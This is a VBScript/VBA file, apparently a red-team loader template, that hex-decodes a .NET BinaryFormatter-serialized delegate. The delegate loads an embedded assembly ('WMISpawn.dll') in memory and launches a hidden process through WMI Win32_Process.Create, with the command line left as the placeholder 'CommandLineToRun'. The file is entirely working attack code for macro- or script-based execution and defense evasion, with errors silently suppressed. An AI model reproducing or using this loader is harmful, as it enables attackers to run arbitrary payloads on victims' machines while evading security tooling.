Sub DebugPrint(s)
End Sub

Sub SetVersion
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim tempDOM, tempELEMENT
    Set tempDOM = CreateObject("Microsoft.XMLDOM")
    Set tempELEMENT = tempDOM.createElement("tmp")
    tempELEMENT.DataType = "bin.hex"
    tempELEMENT.Text = hex
    decodeHex = tempELEMENT.NodeTypedValue
End Function

Function Run()
    On Error Resume Next

    SetVersion

    Dim serialized_obj
        serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
    serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
    serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
    serialized_obj = serialized_obj & "666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44"
    serialized_obj = serialized_obj & "656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    serialized_obj = serialized_obj & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A"
    serialized_obj = serialized_obj & "6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C6567617465536572"
    serialized_obj = serialized_obj & "69616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056"
    serialized_obj = serialized_obj & "657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237"
    serialized_obj = serialized_obj & "376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    serialized_obj = serialized_obj & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C"
    serialized_obj = serialized_obj & "697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374"
    serialized_obj = serialized_obj & "656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    serialized_obj = serialized_obj & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C"
    serialized_obj = serialized_obj & "000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A"
    serialized_obj = serialized_obj & "6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    serialized_obj = serialized_obj & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E54797065"
    serialized_obj = serialized_obj & "5B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B65"
    serialized_obj = serialized_obj & "2853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    serialized_obj = serialized_obj & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E30"
    serialized_obj = serialized_obj & "2E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530"
    serialized_obj = serialized_obj & "383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    serialized_obj = serialized_obj & "6C790617000000044C6F61640A0F0C00000000120000024D5A90000300000004000000FFFF0000B800000000000000400000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD"
    serialized_obj = serialized_obj & "21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    serialized_obj = serialized_obj & "00504500004C0103009E73985A0000000000000000E00002210B013000000A00000006000000000000F62900000020000000"
    serialized_obj = serialized_obj & "4000000000001000200000000200000400000000000000040000000000000000800000000200000000000003004085000010"
    serialized_obj = serialized_obj & "0000100000000010000010000000000000100000000000000000000000A42900004F00000000400000780300000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000006000000C0000006C2800001C0000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E"
    serialized_obj = serialized_obj & "74657874000000FC09000000200000000A000000020000000000000000000000000000200000602E72737263000000780300"
    serialized_obj = serialized_obj & "000040000000040000000C0000000000000000000000000000400000402E72656C6F6300000C000000006000000002000000"
    serialized_obj = serialized_obj & "1000000000000000000000000000004000004200000000000000000000000000000000D82900000000000048000000020005"
    serialized_obj = serialized_obj & "00002100006C0700000300000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000001E02280E00000A2A1B3004008C000000010000117201000070730F00000A731000000A"
    serialized_obj = serialized_obj & "0A721F000070731100000A0B723B000070731100000A0C250706731200000A0D0806731200000A6F1300000A130411047265"
    serialized_obj = serialized_obj & "000070168C170000016F1400000A09727B0000706F1500000A130511057289000070036F1400000A110572A100007011046F"
    serialized_obj = serialized_obj & "1400000A09727B0000701105146F1600000A26DE0326DE002A0110000000007700118800031500000142534A420100010000"
    serialized_obj = serialized_obj & "0000000C00000076322E302E35303732370000000005006C00000034020000237E0000A0020000E802000023537472696E67"
    serialized_obj = serialized_obj & "730000000088050000D8000000235553006006000010000000234755494400000070060000FC00000023426C6F6200000000"
    serialized_obj = serialized_obj & "00000002000001471502000900000000FA0133001600000100000018000000020000000200000001000000160000000E0000"
    serialized_obj = serialized_obj & "000100000001000000020000000000A80101000000000006000E01220206007B01220206005B00F0010F0042020000060083"
    serialized_obj = serialized_obj & "00C5010600F100C5010600D200C50106006201C50106002E01C50106004701C50106009A00C50106006F00030206004D0003"
    serialized_obj = serialized_obj & "020600B500C5010600CC02BE010A006502D3020A009901D3020A009302D3020A00C202D3020A00AD02D3020600D701BE010A"
    serialized_obj = serialized_obj & "003D00D30206000100BE010A005102D302000000000700000000000100010001001000A30200003D00010001005020000000"
    serialized_obj = serialized_obj & "008618EA010600010058200000000086008A02100001000000010019000900EA0101001100EA0106001900EA010A002900EA"
    serialized_obj = serialized_obj & "0110003100EA0110003900EA0110004100EA0110004900EA0110005100EA0110005900EA0110006100EA0115006900EA0110"
    serialized_obj = serialized_obj & "007100EA0110007900EA010600B100EA0110008100EA0106008900EA0110009100EA01290091002E003300A100B501380099"
    serialized_obj = serialized_obj & "0076023E009900210044002E000B0060002E00130069002E001B0088002E00230091002E002B009F002E0033009F002E003B"
    serialized_obj = serialized_obj & "009F002E00430091002E004B00A5002E0053009F002E005B009F002E006300BD002E006B00E70043005B00F4001A00048000"
    serialized_obj = serialized_obj & "000100000000000000000000000000E10100000200000000000000000000004E001000000000000200000000000000000000"
    serialized_obj = serialized_obj & "005700D302000000000000000000496E743332003C4D6F64756C653E006D73636F726C696200636F6D6D616E6400496E766F"
    serialized_obj = serialized_obj & "6B654D6574686F6400437265617465496E7374616E6365004D616E6167656D656E7453636F70650047756964417474726962"
    serialized_obj = serialized_obj & "7574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D62"
    serialized_obj = serialized_obj & "6C795469746C6541747472696275746500417373656D626C7954726164656D61726B41747472696275746500417373656D62"
    serialized_obj = serialized_obj & "6C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E417474726962"
    serialized_obj = serialized_obj & "75746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C617861"
    serialized_obj = serialized_obj & "74696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F"
    serialized_obj = serialized_obj & "7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D6543"
    serialized_obj = serialized_obj & "6F6D7061746962696C697479417474726962757465004D616E6167656D656E745061746800574D49537061776E2E646C6C00"
    serialized_obj = serialized_obj & "7365745F4974656D0053797374656D0053797374656D2E5265666C656374696F6E00457863657074696F6E00574D49537061"
    serialized_obj = serialized_obj & "776E002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F70"
    serialized_obj = serialized_obj & "53657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E67"
    serialized_obj = serialized_obj & "4D6F64657300496E766F6B654D6574686F644F7074696F6E73004F626A6563744765744F7074696F6E73004765744D657468"
    serialized_obj = serialized_obj & "6F64506172616D65746572730052756E436C617373004D616E6167656D656E74436C6173730054657374436C617373004D61"
    serialized_obj = serialized_obj & "6E6167656D656E74426173654F626A656374004D616E6167656D656E744F626A6563740053797374656D2E4D616E6167656D"
    serialized_obj = serialized_obj & "656E7400000000001D5C005C002E005C0072006F006F0074005C00630069006D0076003200001B570069006E00330032005F"
    serialized_obj = serialized_obj & "00500072006F0063006500730073000029570069006E00330032005F00500072006F00630065007300730053007400610072"
    serialized_obj = serialized_obj & "007400750070000015530068006F007700570069006E0064006F007700000D430072006500610074006500001743006F006D"
    serialized_obj = serialized_obj & "006D0061006E0064004C0069006E0065000033500072006F006300650073007300530074006100720074007500700049006E"
    serialized_obj = serialized_obj & "0066006F0072006D006100740069006F006E000000000084E3FDA8D83F1D4DB33879B2B91C04EF0004200101080320000105"
    serialized_obj = serialized_obj & "2001011111042001010E04200101020E07061241124512451249124D125109200301125912451241042000124D052002010E"
    serialized_obj = serialized_obj & "1C05200112510E09200312510E1251126108B77A5C561934E08908B03F5F7F11D50A3A0801000800000000001E0100010054"
    serialized_obj = serialized_obj & "0216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D010008574D49537061776E00000501"
    serialized_obj = serialized_obj & "0000000017010012436F7079726967687420C2A920203230313800002901002436316333616332392D646436302D34643362"
    serialized_obj = serialized_obj & "2D393035322D39383832373132336138656500000C010007312E302E302E3000000501000100000000000000009E73985A00"
    serialized_obj = serialized_obj & "000000020000001C01000088280000880A000052534453E7CF3D18C4F4354999828C42E769389A0100000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000CC2900000000000000000000E6290000002000000000000000000000000000000000000000000000D8290000000000"
    serialized_obj = serialized_obj & "000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000"
    serialized_obj = serialized_obj & "0000000000000001000000000048000000584000001C03000000000000000000001C0334000000560053005F005600450052"
    serialized_obj = serialized_obj & "00530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F0000"
    serialized_obj = serialized_obj & "00000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066"
    serialized_obj = serialized_obj & "006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0047C020000010053"
    serialized_obj = serialized_obj & "007400720069006E006700460069006C00650049006E0066006F000000580200000100300030003000300030003400620030"
    serialized_obj = serialized_obj & "0000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079"
    serialized_obj = serialized_obj & "004E0061006D00650000000000000000003A0009000100460069006C0065004400650073006300720069007000740069006F"
    serialized_obj = serialized_obj & "006E000000000057004D00490053007000610077006E0000000000300008000100460069006C006500560065007200730069"
    serialized_obj = serialized_obj & "006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061"
    serialized_obj = serialized_obj & "006D006500000057004D00490053007000610077006E002E0064006C006C00000000004800120001004C006500670061006C"
    serialized_obj = serialized_obj & "0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030"
    serialized_obj = serialized_obj & "003100380000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000"
    serialized_obj = serialized_obj & "0042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000057004D004900530070"
    serialized_obj = serialized_obj & "00610077006E002E0064006C006C0000000000320009000100500072006F0064007500630074004E0061006D006500000000"
    serialized_obj = serialized_obj & "0057004D00490053007000610077006E0000000000340008000100500072006F006400750063007400560065007200730069"
    serialized_obj = serialized_obj & "006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065"
    serialized_obj = serialized_obj & "007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000002000000C000000F839000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000000010D0000000400000009170000000906000000"
    serialized_obj = serialized_obj & "0916000000061A0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F616428427974655B5D29"
    serialized_obj = serialized_obj & "080000000A0B"

    entry_class = "TestClass"
    dllPath = "CommandLineToRun"

    Dim tempmemstream As Object, tempformatstring As Object, temparraylist As Object
    Set tempmemstream = CreateObject("System.IO.MemoryStream")
    Set tempformatstring = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set temparraylist = CreateObject("System.Collections.ArrayList")

    Dim decodedValue
    decodedValue = decodeHex(serialized_obj)

    For Each i In decodedValue
        tempmemstream.WriteByte i
    Next i

    tempmemstream.Position = 0

    Dim tempselectorvar As Object, tempdeserializer As Object, tempObject As Object
    Set tempselectorvar = tempformatstring.SurrogateSelector
    Set tempdeserializer = tempformatstring.Deserialize_2(tempmemstream)
    temparraylist.Add tempselectorvar

    Set tempObject = tempdeserializer.DynamicInvoke(temparraylist.ToArray()).CreateInstance(entry_class)
	tempObject.RunClass(dllPath)
    
    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function

